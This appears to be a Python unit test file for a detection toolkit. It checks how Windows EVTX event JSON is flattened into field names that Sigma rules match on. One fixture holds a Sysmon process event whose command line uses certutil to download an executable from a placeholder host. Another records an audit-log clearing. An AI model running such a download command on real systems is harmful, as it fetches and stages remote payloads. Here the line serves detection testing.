"""Unit tests for EVTX flattening and sample manifests.

The flattener is what turns nested EVTX JSON into the flat names Sigma rules
address. If it drops a field, a rule silently stops matching real telemetry.
"""
from __future__ import annotations

from collections import Counter

from detkit.samples import event_id_counts, flatten

PROCESS_EVENT = {
    "Event": {
        "System": {
            "Provider": {"#attributes": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{x}"}},
            "EventID": 1,
            "TimeCreated": {"#attributes": {"SystemTime": "2026-08-15T00:00:00Z"}},
            "Execution": {"#attributes": {"ProcessID": 712, "ThreadID": 1912}},
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "Computer": "WS01.corp.local",
            "Correlation": None,
        },
        "EventData": {
            "Image": "C:\\Windows\\System32\\certutil.exe",
            "CommandLine": "certutil -urlcache -f http://x/y.exe",
        },
    }
}

USERDATA_EVENT = {
    "Event": {
        "System": {
            "EventID": {"#attributes": {"Qualifiers": 0}, "#text": 1102},
            "Channel": "Security",
        },
        "UserData": {
            "LogFileCleared": {
                "#attributes": {"xmlns": "http://example"},
                "SubjectUserName": "admmig",
                "SubjectDomainName": "OFFSEC",
            }
        },
    }
}


def test_lifts_eventdata_to_top_level() -> None:
    flat = flatten(PROCESS_EVENT)
    assert flat["Image"].endswith("certutil.exe")
    assert flat["CommandLine"].startswith("certutil")
    assert flat["EventID"] == 1


def test_hoists_system_metadata_and_attribute_blocks() -> None:
    flat = flatten(PROCESS_EVENT)
    assert flat["Channel"] == "Microsoft-Windows-Sysmon/Operational"
    assert flat["Computer"] == "WS01.corp.local"
    # Provider attributes land unprefixed; the others keep their block name.
    assert flat["Name"] == "Microsoft-Windows-Sysmon"
    assert flat["ExecutionProcessID"] == 712
    assert flat["TimeCreatedSystemTime"] == "2026-08-15T00:00:00Z"


def test_unwraps_text_nodes_and_userdata() -> None:
    """1102 carries its EventID as a #text node and its fields under UserData."""
    flat = flatten(USERDATA_EVENT)
    assert flat["EventID"] == 1102
    assert flat["SubjectUserName"] == "admmig"
    assert "#attributes" not in flat
    assert "xmlns" not in flat


def test_tolerates_an_empty_event() -> None:
    assert flatten({}) == {}
    assert flatten({"Event": {}}) == {}


def test_event_id_counts() -> None:
    events = [flatten(PROCESS_EVENT), flatten(USERDATA_EVENT), flatten(PROCESS_EVENT)]
    assert event_id_counts(events) == Counter({1: 2, 1102: 1})
